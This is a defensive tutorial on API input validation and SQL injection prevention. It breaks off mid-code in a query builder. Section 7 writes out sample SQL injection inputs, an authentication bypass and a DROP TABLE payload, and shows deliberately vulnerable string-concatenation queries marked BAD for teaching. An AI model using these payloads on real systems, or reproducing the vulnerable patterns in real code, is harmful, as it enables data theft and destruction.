# Input Validation

> Input validation is the first line of defense in API security. This guide systematically covers type-safe validation with Zod, Joi, and class-validator; JSON Schema; sanitization; SQL injection prevention; and defense against common attack patterns — everything you need for thorough input verification at trust boundaries.

## What You Will Learn

- [ ] Understand validation design principles and the trust boundary model
- [ ] Learn the characteristics and appropriate use cases for Zod, Joi, and class-validator
- [ ] Learn the correct application of sanitization and escaping
- [ ] Implement defenses against major attacks such as SQL injection, XSS, and Mass Assignment
- [ ] Master the design principles for validation error responses
- [ ] Understand how to handle edge cases that frequently appear in production environments

---

## Prerequisites

- Understanding of API authentication patterns → See: [Authentication Patterns](./00-authentication-patterns.md)
- Concepts of rate limiting → See: [Rate Limiting](./01-rate-limiting.md)
- Security threats such as SQL injection and XSS → See: Security Fundamentals

---

## 1. Validation Principles and the Trust Boundary Model

### 1.1 What Is a Trust Boundary?

A trust boundary is a logical boundary that separates the inside of a system from the outside. All data flowing in across this boundary must be treated as potentially malicious.

```
+=====================================================================+
|                    Trust Boundary Model                             |
+=====================================================================+
|                                                                     |
|  External (Untrusted Zone)          Trust Boundary  Internal (Trusted Zone)  |
|  +--------------------------+    |  +--------------------------+    |
|  |  Browser / Mobile App    |    |  |                          |    |
|  |  · Request Body          | ──>|  |  Validation Layer        |    |
|  |  · Query Parameters      |    |  |  ┌──────────────┐       |    |
|  |  · Path Parameters       |    |  |  │ Type Check    │       |    |
|  |  · HTTP Headers          |    |  |  │ Format Check  │       |    |
|  |  · Cookie                |    |  |  │ Range Check   │       |    |
|  |  · File Upload           |    |  |  │ Pattern Check │       |    |
|  +--------------------------+    |  |  │ Business Rules│       |    |
|                                  |  |  │ Sanitization  │       |    |
|  +--------------------------+    |  |  └──────────────┘       |    |
|  |  External API / Webhook  | ──>|  |       │                    |    |
|  |  · Response Body         |    |  |       v                    |    |
|  |  · Header Values         |    |  |  Business Logic Layer     |    |
|  +--------------------------+    |  |       │                    |    |
|                                  |  |       v                    |    |
|  +--------------------------+    |  |  Data Access Layer        |    |
|  |  Data Read From DB       | ──>|  |  (Parameterized Queries)  |    |
|  |  * Previously saved      |    |  +--------------------------+    |
|  |    malicious data risk   |    |                                  |
|  +--------------------------+    |                                  |
|                                                                     |
+=====================================================================+
```

### 1.2 Complete List of Untrusted Inputs

Clearly classify the trust level of every data source an API receives.

| Data Source | Trust Level | Validation Required | Notes |
|-------------|-------------|---------------------|-------|
| Request Body (JSON/XML/Form) | Untrusted | Required | Most targeted by attacks |
| Query Parameters | Untrusted | Required | Easily tampered since they appear in URLs |
| Path Parameters | Untrusted | Required | UUID/ID format verification needed |
| HTTP Headers | Untrusted | Required | Authorization, Content-Type, etc. |
| Cookie | Untrusted | Required | JWT token signature verification required |
| File Upload | Untrusted | Required | Beware of MIME type spoofing |
| External API Response | Conditionally trusted | Recommended | Defense against schema changes |
| Existing DB Data | Conditionally trusted | Recommended | Risk of previously injected malicious data |
| Environment Variables | Internally trusted | Validate at startup | Should be schema-validated at startup |

### 1.3 The 6 Stages of Validation

Validation is not merely a "type check" — it is a multi-layered defense with 6 stages.

```
+===========================================================+
|              6-Stage Validation Pyramid                    |
+===========================================================+
|                                                           |
|                    ┌─────────┐                            |
|                    │ ⑥ Cross │  startDate < endDate       |
|                    │  Check  │  total = sum of line items  |
|                   ┌┴─────────┴┐                           |
|                   │ ⑤ Business│  stock > 0               |
|                   │  Rules    │  age >= 18                |
|                  ┌┴───────────┴┐                          |
|                  │ ④ Pattern   │  Regex-based validation   |
|                  │  Check      │  phone number, postal code|
|                 ┌┴─────────────┴┐                         |
|                 │ ③ Range Check  │  min, max, minLength    |
|                 │               │  maxLength, enum         |
|                ┌┴───────────────┴┐                        |
|                │ ② Format Check  │  email, URL, UUID       |
|                │                 │  ISO 8601 datetime      |
|               ┌┴─────────────────┴┐                       |
|               │ ① Type Check      │  string, number        |
|               │                   │  boolean, array, object│
|               └───────────────────┘                       |
|                                                           |
|  * Lower layers are more fundamental; upper layers are    |
|    more domain-specific                                   |
|  * Passing each stage in order builds up security         |
+===========================================================+
```

### 1.4 The 4 Principles of Validation Design

**Principle 1: Fail Fast**

Detect validation errors as early as possible and abort processing. Never allow invalid data to reach the business logic layer or data access layer.

**Principle 2: Collect All Errors**

From a user experience perspective, return all detected errors at once rather than one at a time. This allows the client to correct all issues in a single pass.

**Principle 3: Specific Error Messages**

Instead of vague messages like "Input is invalid," convey specific content such as "The email address format is incorrect." However, do not expose internal implementation details.

**Principle 4: Whitelist over Blacklist**

Rather than "enumerating prohibited characters," take the approach of "explicitly defining allowed characters." Blacklists cannot keep up with evolving attack patterns.

---

## 2. Validation with Zod

### 2.1 Core Concepts of Zod

Zod is a TypeScript-first schema validation library. Its greatest strength is the ability to automatically infer TypeScript types from schema definitions, eliminating the dual maintenance of validation schemas and type definitions.

```typescript
// ============================================================
// Code Example 1: Zod Basic Schema Definition and Validation
// ============================================================
import { z } from 'zod';

// --- User creation schema ---
const CreateUserSchema = z.object({
  // String field: trim() removes leading and trailing whitespace
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name must be 100 characters or less')
    .trim(),

  // Email address: built-in email validator + lowercase conversion
  email: z.string()
    .email('Invalid email format')
    .toLowerCase(),

  // Numeric field: optional makes it omittable
  age: z.number()
    .int('Age must be an integer')
    .min(0, 'Age must be non-negative')
    .max(150, 'Age must be 150 or less')
    .optional(),

  // Enum: explicitly define allowed values
  role: z.enum(['user', 'admin', 'editor'])
    .default('user'),

  // Array: constrain element type and array size simultaneously
  tags: z.array(z.string().max(50))
    .max(10, 'Maximum 10 tags')
    .default([]),

  // Nested object
  address: z.object({
    street: z.string().min(1),
    city: z.string().min(1),
    postalCode: z.string().regex(/^\d{3}-?\d{4}$/, 'Invalid postal code'),
  }).optional(),
});

// Automatic type inference: generate TypeScript type from schema
type CreateUserInput = z.infer<typeof CreateUserSchema>;
// Inferred result:
// {
//   name: string;
//   email: string;
//   age?: number;
//   role: 'user' | 'admin' | 'editor';
//   tags: string[];
//   address?: { street: string; city: string; postalCode: string };
// }

// --- Validation execution (safe method) ---
function validateInput<T>(schema: z.ZodSchema<T>, data: unknown) {
  const result = schema.safeParse(data);

  if (!result.success) {
    // Convert Zod error info to API response format
    const errors = result.error.issues.map(issue => ({
      field: issue.path.join('.'),
      message: issue.message,
      code: issue.code,
    }));
    return { success: false as const, errors };
  }

  return { success: true as const, data: result.data };
}

// --- Usage example ---
const input = {
  name: '  Tanaka Taro  ',
  email: 'Tanaka@Example.COM',
  age: 25,
  tags: ['developer', 'typescript'],
};

const result = validateInput(CreateUserSchema, input);
if (result.success) {
  console.log(result.data);
  // { name: 'Tanaka Taro', email: 'tanaka@example.com', age: 25,
  //   role: 'user', tags: ['developer', 'typescript'] }
  // * trim() and toLowerCase() are applied automatically
}
```

### 2.2 Integration as an Express Middleware

```typescript
// ============================================================
// Code Example 2: Express Validation Middleware (Generic Design)
// ============================================================
import { z, ZodSchema } from 'zod';
import { Request, Response, NextFunction } from 'express';

// Generic middleware that can specify what to validate
interface ValidateOptions {
  body?: ZodSchema;
  query?: ZodSchema;
  params?: ZodSchema;
}

function validate(schemas: ValidateOptions) {
  return (req: Request, res: Response, next: NextFunction) => {
    const allErrors: Array<{
      location: string;
      field: string;
      code: string;
      message: string;
    }> = [];

    // Validate body
    if (schemas.body) {
      const result = schemas.body.safeParse(req.body);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          allErrors.push({
            location: 'body',
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        req.body = result.data; // Overwrite with validated data
      }
    }

    // Validate query
    if (schemas.query) {
      const result = schemas.query.safeParse(req.query);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          allErrors.push({
            location: 'query',
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        (req as any).validatedQuery = result.data;
      }
    }

    // Validate params
    if (schemas.params) {
      const result = schemas.params.safeParse(req.params);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          allErrors.push({
            location: 'params',
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        (req as any).validatedParams = result.data;
      }
    }

    // Return RFC 7807 format if there are errors
    if (allErrors.length > 0) {
      return res.status(422).json({
        type: 'https://api.example.com/errors/validation',
        title: 'Validation Error',
        status: 422,
        detail: `The request contains ${allErrors.length} validation error(s).`,
        errors: allErrors,
      });
    }

    next();
  };
}

// --- Usage in routing ---

// Get user list: query parameter validation
const PaginationSchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  perPage: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['createdAt', 'name', 'email']).default('createdAt'),
  order: z.enum(['asc', 'desc']).default('desc'),
});

app.get('/api/v1/users',
  validate({ query: PaginationSchema }),
  async (req, res) => {
    const { page, perPage, sort, order } = (req as any).validatedQuery;
    const users = await userService.list({ page, perPage, sort, order });
    res.json({ data: users });
  }
);

// Create user: body validation
app.post('/api/v1/users',
  validate({ body: CreateUserSchema }),
  async (req, res) => {
    const user = await userService.create(req.body);
    res.status(201).json({ data: user });
  }
);

// Get user: path parameter validation
const UserIdParamsSchema = z.object({
  userId: z.string().uuid('Invalid user ID format'),
});

app.get('/api/v1/users/:userId',
  validate({ params: UserIdParamsSchema }),
  async (req, res) => {
    const { userId } = (req as any).validatedParams;
    const user = await userService.findById(userId);
    res.json({ data: user });
  }
);
```

### 2.3 Advanced Validation Patterns

```typescript
// ============================================================
// Code Example 3: Advanced Zod Validation Features
// ============================================================

// --- Custom validation: password strength ---
const PasswordSchema = z.string()
  .min(8, 'Password must be at least 8 characters')
  .max(128, 'Password must be 128 characters or less')
  .refine(
    (val) => /[A-Z]/.test(val),
    'Password must contain at least one uppercase letter'
  )
  .refine(
    (val) => /[a-z]/.test(val),
    'Password must contain at least one lowercase letter'
  )
  .refine(
    (val) => /[0-9]/.test(val),
    'Password must contain at least one digit'
  )
  .refine(
    (val) => /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(val),
    'Password must contain at least one special character'
  );

// --- Cross-field validation: date range ---
const DateRangeSchema = z.object({
  startDate: z.string().datetime(),
  endDate: z.string().datetime(),
}).refine(
  (data) => new Date(data.startDate) < new Date(data.endDate),
  { message: 'End date must be after start date', path: ['endDate'] }
).refine(
  (data) => {
    const diff = new Date(data.endDate).getTime() - new Date(data.startDate).getTime();
    const maxDays = 365;
    return diff <= maxDays * 24 * 60 * 60 * 1000;
  },
  { message: 'Date range must not exceed 365 days', path: ['endDate'] }
);

// --- discriminatedUnion: conditional validation ---
const NotificationSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('email'),
    email: z.string().email(),
    subject: z.string().min(1).max(200),
    body: z.string().min(1).max(10000),
  }),
  z.object({
    type: z.literal('sms'),
    phone: z.string().regex(/^\+?\d{10,15}$/),
    message: z.string().min(1).max(160),
  }),
  z.object({
    type: z.literal('push'),
    deviceToken: z.string().min(1),
    title: z.string().min(1).max(100),
    body: z.string().min(1).max(1000),
  }),
]);

// --- transform: data transformation after validation ---
const SearchQuerySchema = z.object({
  q: z.string()
    .min(1)
    .max(200)
    .transform(val => val.trim().toLowerCase()),

  categories: z.string()
    .transform(val => val.split(',').map(s => s.trim()))
    .pipe(z.array(z.string().min(1)).min(1).max(10))
    .optional(),

  minPrice: z.coerce.number().min(0).optional(),
  maxPrice: z.coerce.number().min(0).optional(),
}).refine(
  (data) => {
    if (data.minPrice !== undefined && data.maxPrice !== undefined) {
      return data.minPrice <= data.maxPrice;
    }
    return true;
  },
  { message: 'minPrice must be less than or equal to maxPrice', path: ['minPrice'] }
);

// --- preprocess: pre-processing input ---
const FlexibleDateSchema = z.preprocess(
  (val) => {
    if (typeof val === 'string') return new Date(val);
    if (typeof val === 'number') return new Date(val);
    return val;
  },
  z.date().min(new Date('2000-01-01')).max(new Date('2100-12-31'))
);

// --- recursive: recursive schema ---
interface Category {
  name: string;
  children: Category[];
}

const CategorySchema: z.ZodType<Category> = z.lazy(() =>
  z.object({
    name: z.string().min(1).max(100),
    children: z.array(CategorySchema).max(50).default([]),
  })
);

// --- strict mode: reject undefined fields ---
const StrictUserSchema = z.object({
  name: z.string(),
  email: z.string().email(),
}).strict(); // Reject extra fields like role, isAdmin, etc.

// StrictUserSchema.parse({ name: 'Taro', email: 'taro@example.com', role: 'admin' })
// -> ZodError: Unrecognized key(s) in object: 'role'
```

---

## 3. Validation with Joi

### 3.1 Features and Basic Usage of Joi

Joi is one of the most established validation libraries in the Node.js ecosystem, having evolved independently from the hapi framework. Its strengths are a rich set of built-in validators and an intuitive API.

```typescript
// ============================================================
// Code Example 4: Schema Definition and Validation with Joi
// ============================================================
import Joi from 'joi';

// --- User creation schema ---
const createUserSchema = Joi.object({
  name: Joi.string()
    .min(1)
    .max(100)
    .trim()
    .required()
    .messages({
      'string.empty': 'Name is required',
      'string.max': 'Name must be 100 characters or less',
    }),

  email: Joi.string()
    .email({ tlds: { allow: false } })
    .lowercase()
    .required()
    .messages({
      'string.email': 'Please enter a valid email address',
    }),

  age: Joi.number()
    .integer()
    .min(0)
    .max(150)
    .optional(),

  role: Joi.string()
    .valid('user', 'admin', 'editor')
    .default('user'),

  tags: Joi.array()
    .items(Joi.string().max(50))
    .max(10)
    .default([]),

  password: Joi.string()
    .min(8)
    .max(128)
    .pattern(/[A-Z]/, 'uppercase')
    .pattern(/[a-z]/, 'lowercase')
    .pattern(/[0-9]/, 'digit')
    .required(),

  passwordConfirm: Joi.string()
    .valid(Joi.ref('password'))
    .required()
    .messages({
      'any.only': 'Password confirmation does not match',
    }),

  address: Joi.object({
    street: Joi.string().min(1).required(),
    city: Joi.string().min(1).required(),
    postalCode: Joi.string()
      .pattern(/^\d{3}-?\d{4}$/)
      .required(),
  }).optional(),
}).options({
  abortEarly: false,  // Collect all errors (do not stop at first)
  stripUnknown: true,  // Remove undefined fields
});

// --- Validation execution ---
function validateWithJoi<T>(
  schema: Joi.ObjectSchema<T>,
  data: unknown
): { success: true; data: T } | { success: false; errors: any[] } {
  const { error, value } = schema.validate(data, {
    abortEarly: false,
    stripUnknown: true,
  });

  if (error) {
    const errors = error.details.map(detail => ({
      field: detail.path.join('.'),
      message: detail.message,
      type: detail.type,
    }));
    return { success: false, errors };
  }

  return { success: true, data: value as T };
}

// --- Conditional validation (when) ---
const paymentSchema = Joi.object({
  method: Joi.string()
    .valid('credit_card', 'bank_transfer', 'convenience')
    .required(),

  // Required only when method is credit_card
  cardNumber: Joi.string()
    .creditCard()
    .when('method', {
      is: 'credit_card',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),

  cardExpiry: Joi.string()
    .pattern(/^(0[1-9]|1[0-2])\/\d{2}$/)
    .when('method', {
      is: 'credit_card',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),

  // Required only when method is bank_transfer
  bankCode: Joi.string()
    .pattern(/^\d{4}$/)
    .when('method', {
      is: 'bank_transfer',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),

  accountNumber: Joi.string()
    .pattern(/^\d{7}$/)
    .when('method', {
      is: 'bank_transfer',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),
});

// --- Express middleware ---
function joiValidate(schema: Joi.ObjectSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true,
    });

    if (error) {
      return res.status(422).json({
        type: 'https://api.example.com/errors/validation',
        title: 'Validation Error',
        status: 422,
        errors: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message,
          type: d.type,
        })),
      });
    }

    req.body = value;
    next();
  };
}
```

---

## 4. Validation with class-validator

### 4.1 Features of class-validator

class-validator is a decorator-based validation library widely adopted as the default validation solution in NestJS. It fits a class-based OOP style and, combined with class-transformer, enables automatic transformation and validation of requests.

```typescript
// ============================================================
// Code Example 5: Validation with class-validator + class-transformer
// ============================================================
import {
  IsString, IsEmail, IsInt, Min, Max, IsOptional,
  IsEnum, IsArray, ArrayMaxSize, MaxLength, MinLength,
  ValidateNested, Matches, IsUUID, ValidateIf,
  registerDecorator, ValidationOptions, ValidationArguments,
} from 'class-validator';
import { Type, Transform, plainToInstance } from 'class-transformer';

// Custom validator decorator
function IsStrongPassword(validationOptions?: ValidationOptions) {
  return function (object: Object, propertyName: string) {
    registerDecorator({
      name: 'isStrongPassword',
      target: object.constructor,
      propertyName: propertyName,
      options: validationOptions,
      validator: {
        validate(value: any) {
          if (typeof value !== 'string') return false;
          return (
            value.length >= 8 &&
            /[A-Z]/.test(value) &&
            /[a-z]/.test(value) &&
            /[0-9]/.test(value)
          );
        },
        defaultMessage(args: ValidationArguments) {
          return 'Password must be at least 8 chars with uppercase, lowercase, and digit';
        },
      },
    });
  };
}

// --- DTO (Data Transfer Object) definition ---
class AddressDto {
  @IsString()
  @MinLength(1)
  street: string;

  @IsString()
  @MinLength(1)
  city: string;

  @IsString()
  @Matches(/^\d{3}-?\d{4}$/, { message: 'Invalid postal code format' })
  postalCode: string;
}

enum UserRole {
  USER = 'user',
  ADMIN = 'admin',
  EDITOR = 'editor',
}

class CreateUserDto {
  @IsString()
  @MinLength(1, { message: 'Name is required' })
  @MaxLength(100, { message: 'Name must be 100 characters or less' })
  @Transform(({ value }) => typeof value === 'string' ? value.trim() : value)
  name: string;

  @IsEmail({}, { message: 'Invalid email format' })
  @Transform(({ value }) => typeof value === 'string' ? value.toLowerCase() : value)
  email: string;

  @IsOptional()
  @IsInt({ message: 'Age must be an integer' })
  @Min(0, { message: 'Age must be non-negative' })
  @Max(150, { message: 'Age must be 150 or less' })
  age?: number;

  @IsEnum(UserRole)
  role: UserRole = UserRole.USER;

  @IsArray()
  @ArrayMaxSize(10, { message: 'Maximum 10 tags' })
  @IsString({ each: true })
  @MaxLength(50, { each: true })
  tags: string[] = [];

  @IsOptional()
  @ValidateNested()
  @Type(() => AddressDto)
  address?: AddressDto;

  @IsStrongPassword({ message: 'Password is too weak' })
  password: string;
}

// --- Usage in NestJS ---
// NestJS automatically runs class-validator through ValidationPipe
//
// @Controller('users')
// export class UsersController {
//   @Post()
//   async create(@Body() dto: CreateUserDto) {
//     // dto is already validated
//     return this.usersService.create(dto);
//   }
// }
//
// // main.ts
// app.useGlobalPipes(new ValidationPipe({
//   whitelist: true,        // Remove properties not defined in the DTO
//   forbidNonWhitelisted: true,  // Error if undefined properties are present
//   transform: true,        // Automatically run plainToInstance
//   transformOptions: {
//     enableImplicitConversion: true,
//   },
// }));

// --- Manual validation execution ---
import { validate } from 'class-validator';

async function validateDto<T extends object>(
  DtoClass: new () => T,
  data: unknown
): Promise<{ success: true; data: T } | { success: false; errors: any[] }> {
  const instance = plainToInstance(DtoClass, data);
  const errors = await validate(instance, {
    whitelist: true,
    forbidNonWhitelisted: true,
  });

  if (errors.length > 0) {
    const formattedErrors = errors.flatMap(err =>
      Object.values(err.constraints || {}).map(message => ({
        field: err.property,
        message,
      }))
    );
    return { success: false, errors: formattedErrors };
  }

  return { success: true, data: instance };
}
```

---

## 5. Validation Library Comparison

### 5.1 Comprehensive Comparison: Zod vs Joi vs class-validator

| Comparison Item | Zod | Joi | class-validator |
|-----------------|-----|-----|-----------------|
| Design Philosophy | TypeScript-first, functional | JavaScript-first, method chaining | Decorator-based, OOP |
| TypeScript Type Inference | Auto-inferred via z.infer | Requires separate type definitions | Inferred from class definition |
| Bundle Size | ~13KB (gzip) | ~45KB (gzip) | ~20KB (gzip) |
| Tree Shaking | Supported | Not supported | Partial support |
| Async Validation | Supported via refine | Supported via external | Supported via custom decorators |
| Conditional Branching | discriminatedUnion | when | ValidateIf |
| Error Messages | Customizable | Detailed via messages() | message option |
| Transformation | transform() | Auto-transform available | class-transformer |
| Recursive Schema | z.lazy() | Joi.link() | ValidateNested |
| Framework Integration | Universal (works anywhere) | High affinity with hapi | Default in NestJS |
| Learning Curve | Low | Moderate | Moderate (requires understanding decorators) |
| npm Weekly Downloads | ~8 million (2025) | ~6 million (2025) | ~4 million (2025) |
| Major Adopters | tRPC, Next.js | hapi, Express | NestJS |

### 5.2 Selection Guidelines

```
+===============================================================+
|         Validation Library Selection Flowchart               |
+===============================================================+
|                                                               |
|  Q1: What is the framework?                                   |
|  ├─ NestJS ──────────> class-validator (recommended)         |
|  ├─ hapi ────────────> Joi (recommended)                      |
|  └─ Other ──> Go to Q2                                        |
|                                                               |
|  Q2: Are you using TypeScript?                                |
|  ├─ Yes ──> Go to Q3                                          |
|  └─ No ───────────────> Joi (easy to use in JavaScript)       |
|                                                               |
|  Q3: Do you prioritize automatic type inference?              |
|  ├─ Yes ──────────────> Zod (unified management of types      |
|  │                           and schemas)                     |
|  └─ No ───────────────> Either is fine                        |
|                                                               |
|  Q4: Do you prioritize bundle size?                           |
|  ├─ Yes ──────────────> Zod (lightest)                        |
|  └─ No ───────────────> Decide based on feature requirements  |
|                                                               |
+===============================================================+
```

---

## 6. Sanitization

### 6.1 Principles of Sanitization

Sanitization (neutralization) is the process of removing or transforming potentially dangerous elements from input data. Unlike validation (verification), its characteristic is that it "converts data into a safe form" rather than "rejecting" it.

An important principle is that sanitization must be applied at both input time and output time.

```
+===============================================================+
|              Sanitization Application Points                  |
+===============================================================+
|                                                               |
|  [Input-Time Sanitization]                                    |
|  · Remove leading/trailing whitespace (trim)                  |
|  · Normalize case (uppercase/lowercase)                       |
|  · Remove control characters                                  |
|  · Unicode normalization (NFC/NFKC)                           |
|  · Remove NULL bytes                                          |
|                                                               |
|  [Output-Time Sanitization]                                   |
|  · HTML escaping (when outputting to browser)                 |
|  · SQL parameter binding (when executing DB queries)          |
|  · URL encoding (when embedding in URLs)                      |
|  · JSON escaping (when generating JSON responses)             |
|                                                               |
|  * Store data as "raw data" wherever possible, and escape     |
|    according to the output context                            |
+===============================================================+
```

### 6.2 Implementing HTML Escaping

```typescript
// HTML escaping (fundamental XSS countermeasure)
function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, (c) => map[c]);
}

// Advanced sanitization using DOMPurify (server-side)
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
}

// Integrate sanitization with Zod transform
const CommentSchema = z.object({
  content: z.string()
    .min(1, 'Comment is required')
    .max(10000, 'Comment must be 10000 characters or less')
    .transform(escapeHtml),

  htmlContent: z.string()
    .max(50000)
    .transform(sanitizeHtml)
    .optional(),
});
```

### 6.3 Control Character and Unicode Normalization

```typescript
// Remove control characters
function removeControlChars(str: string): string {
  // Remove ASCII control characters (tab, newline, carriage return are allowed)
  return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
}

// Remove NULL bytes (path traversal countermeasure)
function removeNullBytes(str: string): string {
  return str.replace(/\0/g, '');
}

// Unicode normalization (unify strings that look the same but have different byte sequences)
function normalizeUnicode(str: string): string {
  return str.normalize('NFC');
}

// Comprehensive sanitization function
function sanitizeInput(str: string): string {
  return normalizeUnicode(
    removeNullBytes(
      removeControlChars(str.trim())
    )
  );
}

// Comprehensive sanitization with Zod
const SafeStringSchema = z.string()
  .max(1000)
  .transform(sanitizeInput);
```

### 6.4 File Upload Validation

```typescript
// File upload validation
const FileUploadSchema = z.object({
  filename: z.string()
    .max(255)
    .regex(/^[a-zA-Z0-9._-]+$/, 'Invalid filename characters')
    .refine(
      (name) => !name.includes('..'),
      'Path traversal detected'
    ),
  mimeType: z.enum([
    'image/jpeg', 'image/png', 'image/webp', 'image/gif',
    'application/pdf',
    'text/plain', 'text/csv',
  ]),
  size: z.number()
    .max(10 * 1024 * 1024, 'File must be under 10MB'),
});

// MIME type verification via magic bytes
// * The Content-Type header can be spoofed, so verify the actual
//   format by checking the leading bytes of the file
const MAGIC_BYTES: Record<string, Buffer> = {
  'image/jpeg': Buffer.from([0xFF, 0xD8, 0xFF]),
  'image/png': Buffer.from([0x89, 0x50, 0x4E, 0x47]),
  'image/gif': Buffer.from([0x47, 0x49, 0x46]),
  'application/pdf': Buffer.from([0x25, 0x50, 0x44, 0x46]),
};

function verifyMimeType(buffer: Buffer, claimedMime: string): boolean {
  const expected = MAGIC_BYTES[claimedMime];
  if (!expected) return false;
  return buffer.subarray(0, expected.length).equals(expected);
}
```

---

## 7. SQL Injection Prevention

### 7.1 How SQL Injection Works

SQL injection is a vulnerability that occurs when user input is interpreted as part of a SQL query. It consistently ranks at the top of the OWASP Top 10 and can cause devastating damage such as data leakage, tampering, and deletion.

```
+================================================================+
|              SQL Injection Attack Flow                         |
+================================================================+
|                                                                |
|  [Normal Request]                                              |
|  POST /api/login                                               |
|  { "email": "taro@example.com", "password": "secret123" }      |
|                                                                |
|  Generated SQL (with string concatenation = DANGEROUS):        |
|  SELECT * FROM users                                           |
|    WHERE email = 'taro@example.com'                            |
|      AND password = 'secret123'                                |
|                                                                |
|  ─────────────────────────────────────                         |
|                                                                |
|  [Attack Request]                                              |
|  POST /api/login                                               |
|  { "email": "' OR '1'='1' --", "password": "anything" }       |
|                                                                |
|  Generated SQL:                                                |
|  SELECT * FROM users                                           |
|    WHERE email = '' OR '1'='1' --'                             |
|      AND password = 'anything'                                 |
|                                                                |
|  Interpretation: WHERE (email='') OR ('1'='1')                 |
|  Result: All records are returned (authentication bypass)      |
|                                                                |
|  ─────────────────────────────────────                         |
|                                                                |
|  [Destructive Attack]                                          |
|  { "email": "'; DROP TABLE users; --" }                        |
|                                                                |
|  Generated SQL:                                                |
|  SELECT * FROM users                                           |
|    WHERE email = ''; DROP TABLE users; --'                     |
|                                                                |
|  Result: The users table is deleted                            |
|                                                                |
+================================================================+
```

### 7.2 Parameterized Queries (Prepared Statements)

The fundamental countermeasure against SQL injection is to use parameterized queries (prepared statements). This ensures that user input is always treated as "data" and is never interpreted as SQL syntax.

```typescript
// ============================================================
// Code Example 6: Various Implementations of Parameterized Queries
// ============================================================

// --- pg (PostgreSQL) ---
import { Pool } from 'pg';
const pool = new Pool();

// BAD: String concatenation (never do this)
async function findUserBad(email: string) {
  // !! VULNERABLE !!
  const result = await pool.query(
    `SELECT * FROM users WHERE email = '${email}'`
  );
  return result.rows[0];
}

// GOOD: Parameterized query
async function findUserGood(email: string) {
  const result = await pool.query(
    'SELECT * FROM users WHERE email = $1',
    [email]
  );
  return result.rows[0];
}

// GOOD: Multiple parameters
async function searchUsers(name: string, role: string, limit: number) {
  const result = await pool.query(
    `SELECT id, name, email, role FROM users
     WHERE name ILIKE $1 AND role = $2
     ORDER BY created_at DESC
     LIMIT $3`,
    [`%${name}%`, role, limit]
  );
  return result.rows;
}

// --- mysql2 ---
import mysql from 'mysql2/promise';

async function findUserMySQL(email: string) {
  const [rows] = await connection.execute(
    'SELECT * FROM users WHERE email = ?',
    [email]
  );
  return rows[0];
}

// --- Prisma ORM ---
// Prisma uses parameterized queries internally, so
// normal API usage does not result in SQL injection
async function findUserPrisma(email: string) {
  return prisma.user.findUnique({
    where: { email },  // Automatically parameter-bound
  });
}

// Caution is needed when using Prisma.$queryRaw
// BAD:
const resultBad = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE email = '${email}'`
);

// GOOD: Use template literals (Prisma auto-parameterizes)
const resultGood = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${email}
`;

// --- Knex.js ---
// Knex's query builder automatically handles parameter binding
async function findUserKnex(email: string) {
  return knex('users').where({ email }).first();
}

// When using whereRaw, specify bindings explicitly
async function searchUserKnex(name: string) {
  return knex('users')
    .whereRaw('name ILIKE ?', [`%${name}%`])
    .orderBy('created_at', 'desc');
}
```

### 7.3 Safely Building Dynamic Queries

For features like search where conditions change dynamically, use the query builder pattern to construct queries safely.

```typescript
// Safe construction of dynamic search queries
interface UserSearchParams {
  name?: string;
  email?: string;
  role?: string;
  minAge?: number;
  maxAge?: number;
  sortBy?: string;
  order?: 'asc' | 'desc';
  page?: number;
  perPage?: number;
}

// Pre-validate parameters with Zod
const UserSearchParamsSchema = z.object({
  name: z.string().max(100).optional(),
  email: z.string().email().optional(),
  role: z.enum(['user', 'admin', 'editor']).optional(),
  minAge: z.coerce.number().int().min(0).max(150).optional(),
  maxAge: z.coerce.number().int().min(0).max(150).optional(),
  sortBy: z.enum(['name', 'email', 'created_at']).default('created_at'),
  order: z.enum(['asc', 'desc']).default('desc'),
  page: z.coerce.number().int().min(1).default(1),
  perPage: z.coerce.number().int().min(1).max(100).default(20),
}).refine(
  (data) => {
    if (data.minAge !== undefined && data.maxAge !== undefined) {
      return data.minAge <= data.maxAge;
    }
    return true;
  },
  { message: 'minAge must be <= maxAge' }
);

// Safe dynamic query builder
async function searchUsers(params: UserSearchParams) {
  const conditions: string[] = [];
  const values: any[] = [];
  let paramIndex = 1;

  if (params.name) {
    conditions.push(`name ILIKE $${paramIndex++}`);
    values.push(`%${params.name}%`);
  }

  if (params.email) {
    conditions.push(`email = $${paramIndex++}`);
    values.push(params.email);
  }

  if (params.role) {
    conditions.push(`role = $${paramIndex++}`);
    values.push(params.role);
  }

  if (params.minAge !== undefined) {
    conditions.push(`age >= $${paramIndex++}`);
    values.push(params.minAge);
  }

  if (params.maxAge !== undefined) {
    conditions.push(`age <= $${paramIndex++}`);
    values.push(params.maxAge);
  }

  const whereClause = conditions.length > 0
    ? `WHERE ${conditions.join(' AND ')}`
